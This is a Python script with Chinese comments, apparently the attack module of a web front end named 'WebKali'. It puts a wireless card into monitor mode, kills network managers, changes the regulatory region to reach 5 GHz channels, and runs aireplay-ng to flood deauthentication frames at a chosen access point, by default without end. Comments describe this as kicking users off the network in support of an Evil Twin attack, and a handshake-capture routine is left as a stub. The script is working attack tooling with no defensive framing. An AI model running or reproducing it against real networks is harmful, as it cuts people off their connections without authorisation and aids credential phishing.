import argparse
import subprocess
import time
import os
import sys
import shutil

# ==========================================
# WebKali 攻击执行单元 (增强版 - 5G Ready)
# ==========================================

# 修复环境变量，确保能找到工具
os.environ["PATH"] += os.pathsep + "/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"


def run_cmd(cmd):
    """执行命令但不阻塞，返回结果"""
    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def log(msg):
    """格式化输出，方便前端读取"""
    print(f"[Deauth] {msg}")
    sys.stdout.flush()


def setup_monitor(interface, channel):
    log(f"正在配置网卡 {interface} 进入监听模式 (Channel {channel})...")

    # 杀掉干扰进程
    run_cmd("killall wpa_supplicant NetworkManager dhclient")

    # 解锁区域限制，允许使用 5G 高频段
    run_cmd("iw reg set US")

    # 1. 尝试使用 airmon-ng (更稳定)
    if shutil.which("airmon-ng"):
        run_cmd(f"airmon-ng check kill")
        # 手动停止网卡防止占用
        run_cmd(f"ip link set {interface} down")
        run_cmd(f"iw dev {interface} set type monitor")
        run_cmd(f"ip link set {interface} up")
    else:
        # 2. 强制使用 iw/ip 命令设置 (双重保险)
        run_cmd(f"ip link set {interface} down")
        run_cmd(f"iw dev {interface} set type monitor")
        run_cmd(f"ip link set {interface} up")

    # 3. 强力锁频 (尝试多次)
    # iwconfig 对 5G 支持不好，必须用 iw
    for _ in range(3):
        run_cmd(f"iw dev {interface} set channel {channel}")
        time.sleep(0.2)


def attack_deauth(bssid, interface, channel, duration):
    """
    执行 Deauth 洪水攻击
    duration: 0 表示无限攻击，直到被 kill
    """
    # 最后一次锁频确认
    run_cmd(f"iw dev {interface} set channel {channel}")

    log(f"🔥 开始攻击目标: {bssid} (CH:{channel})")
    log(f"🔥 攻击强度: 无限循环 (直至手动停止)")

    # -0 0 表示无限次发送 Deauth 包
    # -a 目标BSSID
    # --ignore-negative-one 修复部分网卡报错
    # -D 禁用 AP 检测 (强制发送)
    cmd = [
        "aireplay-ng",
        "--ignore-negative-one",
        "-D",
        "-0", "0",
        "-a", bssid,
        interface
    ]

    # 使用 Popen 启动，以便我们可以实时获取输出
    process = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

    start_time = time.time()

    try:
        # 实时读取输出并打印，这样前端就能看到了
        while True:
            # 如果设定了时长且超时，则退出 (但在 Evil Twin 模式下通常是无限的)
            if duration > 0 and (time.time() - start_time) > duration:
                break

            line = process.stdout.readline()
            if not line and process.poll() is not None:
                break

            if line:
                line = line.strip()
                # 过滤一些无用信息，只显示关键攻击日志
                if "Sending" in line and "DeAuth" in line:
                    print(f"[Attack] ⚡ 命中目标! 正在持续踢人 (CH:{channel})")
                elif "Waiting for beacon frame" in line:
                    # 如果找不到信号，尝试自动校准信道
                    run_cmd(f"iw dev {interface} set channel {channel}")
                    print(f"[Search] 信号丢失，正在重新锁频...")
                elif "No such device" in line:
                    print(f"[Error] 网卡丢失或被占用！")
                    break
                else:
                    # 其他信息直接打印
                    pass

            sys.stdout.flush()

    except KeyboardInterrupt:
        log("攻击被用户终止")
    finally:
        process.terminate()
        run_cmd("killall aireplay-ng")
        log("攻击进程已结束")


def capture_handshake(bssid, interface, channel, duration):
    # ... (这部分由之前的代码处理，Evil Twin 模式主要用上面的 attack_deauth)
    pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("mode")
    parser.add_argument("--bssid", required=True)
    parser.add_argument("--interface", default="wlan0")
    parser.add_argument("--channel", default="1")
    parser.add_argument("--duration", default="0")  # 默认无限
    args = parser.parse_args()

    setup_monitor(args.interface, args.channel)

    if args.mode == "deauth":
        attack_deauth(args.bssid, args.interface, args.channel, int(args.duration))
    # handshake 模式略，Evil Twin 暂时只用 deauth